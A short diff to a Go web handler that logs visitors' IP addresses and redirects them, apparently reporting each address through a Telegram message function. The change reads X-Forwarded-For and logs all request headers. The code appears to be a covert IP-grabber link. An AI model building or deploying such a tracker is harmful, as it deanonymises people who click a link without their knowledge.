@@ -44,10 +44,13 @@ func sendTelegramMessage(message string) {
 
 // logIp handles logging the IP address and redirecting
 func logIp(w http.ResponseWriter, r *http.Request) {
-	ip := r.RemoteAddr
+	log.Println("headers:", r.Header)
+	ip := r.Header.Get("X-Forwarded-For")
 	if ip == "" {
-		ip = "Unknown"
+		log.Println("X-Forwarded-For header not found, using RemoteAddr")
+		ip = r.RemoteAddr
 	}
+
 	message := fmt.Sprintf("IP Address: %s", ip)
 	fmt.Println(message)
 
